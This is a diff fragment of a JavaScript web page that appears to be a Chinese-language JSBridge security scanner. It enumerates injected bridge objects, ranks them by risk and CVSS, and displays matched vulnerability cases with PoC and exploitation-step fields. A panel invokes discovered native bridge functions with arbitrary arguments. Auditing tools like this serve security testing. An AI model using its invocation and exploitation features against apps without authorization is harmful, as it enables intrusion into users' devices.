+ const obj = window[key];
+ const type = typeof obj;
+
+ if (!isLikelyBridge(obj)) continue;
+
+ const methods = [];
+ const objInfo = identifyInterface(key);
+ let maxRisk = objInfo ? objInfo.riskLevel : "pending";
+ let maxCVSS = objInfo ? objInfo.cvss : 0;
+
+ if (objInfo && objInfo.caseId) {
+  detectedCases.add(objInfo.caseId);
+ }
+
+ if (obj && (type === "object" || type === "function")) {
+  for (const prop in obj) {
+   try {
+    const propType = typeof obj[prop];
+    const propInfo = identifyInterface(prop);
+    const propRisk = propInfo ? propInfo.riskLevel : "pending";
+
+    if (propInfo && propInfo.caseId) {
+     detectedCases.add(propInfo.caseId);
+    }
+
+    const levelOrder = { critical: 0, high: 1, medium: 2, low: 3, pending: 4 };
+    if (levelOrder[propRisk] < levelOrder[maxRisk]) maxRisk = propRisk;
+    if (propInfo && propInfo.cvss > maxCVSS) maxCVSS = propInfo.cvss;
+
+    methods.push({ name: prop, type: propType, risk: propRisk, interfaceInfo: propInfo });
+   } catch(e) {}
+  }
+ }
+
+ scanResults.push({
+  name: key,
+  type: type,
+  risk: maxRisk,
+  cvss: maxCVSS,
+  methods: methods,
+  interfaceInfo: objInfo
+ });
+}
+
+// 排序
+const order = { critical: 0, high: 1, medium: 2, low: 3, pending: 4 };
+scanResults.sort((a, b) => order[a.risk] - order[b.risk]);
+
+// 统计
+const counts = { critical: 0, high: 0, medium: 0, low: 0, pending: 0, total: scanResults.length };
+scanResults.forEach(r => counts[r.risk]++);
+
+window.scanResults = scanResults;
+window.detectedCases = Array.from(detectedCases);
+window.VULN_CASES = VULN_CASES;
+
+// ===================== 渲染案例面板 =====================
+const caseList = document.getElementById("case-list");
+const relevantCases = VULN_CASES.filter(c =>
+ detectedCases.includes(c.id) ||
+ c.interfaces.some(iface => injectedProps.some(p => p.toLowerCase().includes(iface.toLowerCase())))
+);
+
+if (relevantCases.length === 0) {
+ caseList.innerHTML = '<div style="color:var(--text-dim);font-size:0.85em;">未检测到已知漏洞案例匹配的接口，但不代表绝对安全。</div>';
+} else {
+ caseList.innerHTML = relevantCases.map(c => `
+  <div class="case-item">
+   <div class="case-header">
+    <span class="case-name">${c.name}</span>
+    <span class="case-tag ${c.severity}">${c.id}</span>
+   </div>
+   <div class="case-desc">${c.desc}</div>
+   <div style="font-size:0.75em;color:var(--text-dim);margin-bottom:6px;">
+    <b>影响:</b> ${c.affected} | <b>CVSS:</b> ${c.cvss}
+   </div>
+   <div class="case-poc">${c.poc}</div>
+   <div style="font-size:0.75em;margin-bottom:4px;"><b>利用步骤:</b></div>
+   <ol style="margin:0 0 6px 0;padding-left:18px;font-size:0.8em;">
+    ${c.steps.map(s => `<li>${s}</li>`).join("")}
+   </ol>
+   <div class="case-ref">参考: ${c.ref}</div>
+  </div>
+ `).join("");
+}
+
+// ===================== 渲染统计 =====================
+document.getElementById("stats").innerHTML = `
+<div class="stat-box total" onclick="filterByRisk('all')"><span class="count">${counts.total}</span><span class="label">总计</span></div>
+<div class="stat-box critical" onclick="filterByRisk('critical')"><span class="count">${counts.critical}</span><span class="label">严重</span></div>
+<div class="stat-box high" onclick="filterByRisk('high')"><span class="count">${counts.high}</span><span class="label">高危</span></div>
+<div class="stat-box medium" onclick="filterByRisk('medium')"><span class="count">${counts.medium}</span><span class="label">中危</span></div>
+<div class="stat-box low" onclick="filterByRisk('low')"><span class="count">${counts.low}</span><span class="label">低危</span></div>
+`;
+
+// ===================== 渲染列表 =====================
+let currentFilter = "all";
+renderResults(currentFilter);
+
+function renderResults(filter) {
+ currentFilter = filter;
+ let list = filter === "all" ? [...scanResults] : scanResults.filter(r => r.risk === filter);
+
+ const search = document.getElementById("search").value.toLowerCase();
+ if (search) {
+  list = list.filter(r =>
+   r.name.toLowerCase().includes(search) ||
+   r.methods.some(m => m.name.toLowerCase().includes(search)) ||
+   (r.interfaceInfo && r.interfaceInfo.category.toLowerCase().includes(search)) ||
+   (r.interfaceInfo && r.interfaceInfo.caseId && r.interfaceInfo.caseId.toLowerCase().includes(search))
+  );
+ }
+
+ list.sort((a, b) => order[a.risk] - order[b.risk]);
+
+ const container = document.getElementById("results");
+ if (!list.length) {
+  container.innerHTML = '<div class="empty">没有找到匹配的接口</div>';
+  return;
+ }
+
+ container.innerHTML = list.map((item, idx) => {
+  const caseInfo = item.interfaceInfo && item.interfaceInfo.caseId ? getCaseById(item.interfaceInfo.caseId) : null;
+  return `
+  <div class="item ${item.risk}" data-idx="${idx}">
+   <div class="item-header" onclick="toggleItem(${idx})">
+    <div>
+     <span class="item-name">${item.name}</span>
+     <span class="item-type">${item.type}</span>
+     ${item.interfaceInfo ? `<span class="item-category">[${item.interfaceInfo.category}]</span>` : ''}
+    </div>
+    <div class="item-right">
+     <span class="risk-tag ${item.risk}">${item.risk.toUpperCase()}</span>
+     <span class="arrow">▼</span>
+    </div>
+   </div>
+   <div class="item-body">
+    ${item.interfaceInfo ? `
+    <div class="item-info">
+     <div class="item-info-title">📌 ${item.interfaceInfo.category} (CVSS: ${item.cvss})</div>
+     <div class="item-info-desc">${item.interfaceInfo.desc}</div>
+     ${caseInfo ? `<div style="margin-top:4px;color:var(--orange);">参考案例: ${caseInfo.id}</div>` : ''}
+    </div>
+    ` : ''}
+    <div class="method-list">
+     ${item.methods.map(m => `
+     <div class="method-item">
+      <span class="method-type ${m.type === 'function' ? 'function' : ''}">${m.type}</span>
+      <span class="method-name">${m.name}</span>
+      ${m.interfaceInfo ? `<span style="font-size:0.6em;color:var(--text-dim);">[${m.interfaceInfo.category}]</span>` : ''}
+      ${m.risk !== 'low' && m.risk !== 'pending' ? `<span class="risk-tag ${m.risk}" style="font-size:0.6em;">${m.risk}</span>` : ''}
+      <button class="method-btn" onclick="copyText('${item.name}.${m.name}')">复制</button>
+     </div>
+     `).join("")}
+    </div>
+    <div class="call-panel">
+     <div class="call-title">🔧 调用测试</div>
+     <div class="call-row">
+      <input type="text" class="call-input" id="call-input-${idx}" placeholder="参数 (JSON或字符串)">
+      <button class="call-btn" onclick="tryCall('${item.name}', ${idx})">执行</button>
+     </div>
+     <div class="call-result" id="call-result-${idx}"></div>
+    </div>
+   </div>
+  </div>
+ `;
+ }).join("");
+}
+
+window.renderResults = renderResults;
+
+window.filterByRisk = function(risk) {
+ document.getElementById("search").value = "";
+ renderResults(risk);
+};
+
+window.applySearch = function() {
+ renderResults(currentFilter);
+};
+
+window.toggleItem = function(idx) {
+ const item = document.querySelector(`.item[data-idx="${idx}"]`);
+ if (item) item.classList.toggle('expanded');
+};
+
+window.expandAll = function() {
+ document.querySelectorAll('.item').forEach(el => el.classList.add('expanded'));
+};
+
+window.collapseAll = function() {
+ document.querySelectorAll('.item').forEach(el => el.classList.remove('expanded'));
+};
+
+// ===================== 调用测试 =====================
+window.tryCall = function(objName, idx) {
+ const input = document.getElementById(`call-input-${idx}`)?.value || "";
+ const resultDiv = document.getElementById(`call-result-${idx}`);
+ resultDiv.style.display = "block";
+ resultDiv.className = "call-result info";
+ resultDiv.textContent = "执行中...";
+
+ setTimeout(() => {
+  try {
+   const obj = window[objName];
+   const type = typeof obj;
+
+   if (type === "function") {
+    let args = [];
+    if (input.trim()) {
+     try { args = [JSON.parse(input)]; } catch { args = [input]; }
+    }
+    const result = obj.apply(null, args);
+    resultDiv.className = "call-result success";
+    resultDiv.textContent = `✓ 成功\n返回: ${JSON.stringify(result, null, 2) || String(result)}`;
+   } else if (type === "object") {
+    resultDiv.className = "call-result info";
+    resultDiv.textContent = `对象信息:\n类型: ${type}\n属性: ${Object.keys(obj).length}个\n${JSON.stringify(obj, null, 2).slice(0, 300)}`;
+   } else {
+    resultDiv.className = "call-result success";
+    resultDiv.textContent = `值: ${String(obj)}`;
+   }
+  } catch(err) {
+   resultDiv.className = "call-result error";
+   resultDiv.textContent = `✗ 失败: ${err.message}`;
+  }
+ }, 50);
+};
+
+window.copyText = function(text) {
+ navigator.clipboard.writeText(text).then(() => showToast("已复制: " + text));
+};
+
+// ===================== 导出 =====================
+window.exportJSON = function() {
+ const data = {
+  scanTime: new Date().toISOString(),
+  url: location.href,
+  userAgent: navigator.userAgent,
+  summary: counts,
+  detectedCases: window.detectedCases,
+  interfaces: scanResults
+ };
+ showModal("导出JSON", JSON.stringify(data, null, 2));
+};
+
+window.exportReport = function() {
+ let md = `# JSBridge 安全检测报告\n\n`;
+ md += `**扫描时间:** ${new Date().toLocaleString()}\n`;
+ md += `**页面:** ${location.href}\n\n`;
+
+ md += `## 检测结果\n\n`;
+ md += `- 严重: ${counts.critical}\n`;
+ md += `- 高危: ${counts.high}\n`;
+ md += `- 中危: ${counts.medium}\n`;
+ md += `- 低危: ${counts.low}\n`;
+ md += `- 待确认: ${counts.pending}\n`;
+ md += `- **总计: ${counts.total}**\n\n`;
+
+ if (window.detectedCases.length > 0) {
+  md += `## 匹配的漏洞案例\n\n`;
+  VULN_CASES.filter(c => window.detectedCases.includes(c.id)).forEach(c => {
+   md += `### ${c.name} [${c.severity.toUpperCase()}]\n`;
+   md += `- **ID:** ${c.id}\n`;
+   md += `- **描述:** ${c.desc}\n`;
+   md += `- **影响:** ${c.affected}\n`;
+   md += `- **CVSS:** ${c.cvss}\n`;
+   md += `- **参考:** ${c.ref}\n\n`;
+  });
+ }
+
+ md += `## 接口详情\n\n`;
+ scanResults.forEach(item => {
+  md += `### ${item.name} [${item.risk.toUpperCase()}]\n`;
+  if (item.interfaceInfo) {
+   md += `- 分类: ${item.interfaceInfo.category}\n`;
+   md += `- CVSS: ${item.cvss}\n`;
+   md += `- 说明: ${item.interfaceInfo.desc}\n`;
+  }
+  md += `- 方法数: ${item.methods.length}\n`;
+  item.methods.forEach(m => {
+   md += `  - ${m.name} (${m.risk})${m.interfaceInfo ? ` [${m.interfaceInfo.category}]` : ''}\n`;
+  });
+  md += `\n`;
+ });
+
+ showModal("导出报告", md);
+};
+
+window.showModal = function(title, content) {
+ document.getElementById("modal-title").textContent = title;
+ document.getElementById("modal-body").textContent = content;
+ document.getElementById("modal").classList.add("show");
+};
+
+window.closeModal = function() {
+ document.getElementById("modal").classList.remove("show");
+};
+
+window.copyModal = function() {
+ const text = document.getElementById("modal-body").textContent;
+ navigator.clipboard.writeText(text).then(() => showToast("已复制"));
+};
+
+// ===================== 主题切换 =====================
+window.toggleTheme = function() {
+ const html = document.documentElement;
+ const current = html.getAttribute("data-theme");
+ html.setAttribute("data-theme", current === "light" ? "dark" : "light");
+ localStorage.setItem("jsbridge-theme", html.getAttribute("data-theme"));
+};
+
+const savedTheme = localStorage.getItem("jsbridge-theme");
+if (savedTheme) document.documentElement.setAttribute("data-theme", savedTheme);
+
+// ===================== Toast =====================
+function showToast(msg) {
+ const toast = document.getElementById("toast");
+ toast.textContent = msg;
+ toast.classList.add("show");
+ setTimeout(() => toast.classList.remove("show"), 1500);
+}
+
+// ===================== 扫描完成 =====================
+setTimeout(() => {
+ let msg = `扫描完成!\n\n`;
+ msg += `接口统计:\n`;
+ msg += `- 严重: ${counts.critical}\n`;
+ msg += `- 高危: ${counts.high}\n`;
+ msg += `- 中危: ${counts.medium}\n`;
+ msg += `- 低危: ${counts.low}\n`;
+ msg += `- 待确认: ${counts.pending}\n`;
+ msg += `- 总计: ${counts.total}\n\n`;
+ if (window.detectedCases.length > 0) {
+  msg += `匹配漏洞案例: ${window.detectedCases.length}个\n`;
+ }
+ alert(msg);
+}, 100);
+
+})();
+</script>
+</body>
+</html>
